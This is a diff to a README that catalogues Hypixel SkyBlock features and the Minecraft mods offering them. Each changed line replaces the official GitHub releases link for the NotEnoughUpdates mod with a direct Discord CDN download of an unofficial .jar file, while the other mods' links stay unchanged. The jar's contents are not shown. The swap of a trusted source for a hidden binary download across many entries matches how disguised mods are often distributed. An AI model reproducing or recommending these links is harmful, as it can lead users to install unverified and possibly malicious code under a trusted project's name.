@@ -32,7 +32,7 @@ Feel free to make a pull request to add them.
 * Improve Clicks On Sb Menus - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Custom Museum Gui - ?
 * Custom Dungeon Ready Gui - ?
-* Inventory Search Bar - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Inventory Search Bar - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Custom Hp And Mana Bar - ?
 
 
@@ -69,8 +69,8 @@ Feel free to make a pull request to add them.
 * Render Mythological Mob Hp On Screen - ?
 * Tia Relay Helper - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
 * Warp To Closest Warp To Burrow - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
-* Shiny Block Highlighter - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
-* Glowing Mushroom Highlighter - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Shiny Block Highlighter - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
+* Glowing Mushroom Highlighter - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Trevor Theodite Solver - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
 * Block Zapper Cooldown - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Use Mana Reminder (Bingo) - ?
@@ -101,7 +101,7 @@ Feel free to make a pull request to add them.
 
 * FPS Counter - [isXander's EvergreenHUD](https://modrinth.com/mod/evergreenhud)
 * CPS Counter - [isXander's EvergreenHUD](https://modrinth.com/mod/evergreenhud)
-* Show Current Pet - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest) / [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
+* Show Current Pet - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar) / [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
 * Show Current Location - [isXander's EvergreenHUD](https://modrinth.com/mod/evergreenhud)
 * Show Soulflow - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * TPS Display - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
@@ -109,11 +109,11 @@ Feel free to make a pull request to add them.
 * Current Spotify Song - ?
 * Current Lobby Day - [isXander's EvergreenHUD](https://modrinth.com/mod/evergreenhud)
 * Current Day Only Under Day 30 - ?
-* God Potion Expiration Timer - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* God Potion Expiration Timer - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Show Specific Stats On Hud - ?
 * Hud Stats Can Go Over Lvl 60 - ?
 * Show Dragon Damages - ?
-* Spider's Den Thundering Timer - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Spider's Den Thundering Timer - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Packets/Second - ?
 
 
@@ -128,7 +128,7 @@ Feel free to make a pull request to add them.
 * $/hr From Gemstone Mining - ?
 * Forge NPC Price - ?
 * Current And Next CH Events - ?
-* Metal Detector Solver - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Metal Detector Solver - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Alert When All 4 Tools Found - ?
 
 
@@ -201,11 +201,11 @@ Feel free to make a pull request to add them.
 
 * Compact Powder Messages - [Sychic & Lily's Skytils](https://github.com/Skytils/SkytilsMod/releases/latest)
 * Fix x2 Powder Messages - ?
-* Powder Info On HUD - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases) / [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Powder Info On HUD - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases) / [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Powder Per Hour - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
 * Chests Per Hour - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
 * Reset Data On Leaving Ch - ?
-* Chest Dug Alert - [Moulberry's NotEnoughUpdates](https://github.com/Moulberry/NotEnoughUpdates/releases/latest)
+* Chest Dug Alert - [Moulberry's NotEnoughUpdates](https://cdn.discordapp.com/attachments/1028896920346841118/1158980842455056415/NotEnoughUpdates-2.1.1-Alpha-22.jar)
 * Gemstone Message Hider - [hannibal2's SkyHanni](https://github.com/hannibal002/SkyHanni/releases)
 * Wishing Compass Message Hider - ?
 * Ascension Rope Message Hider - ?
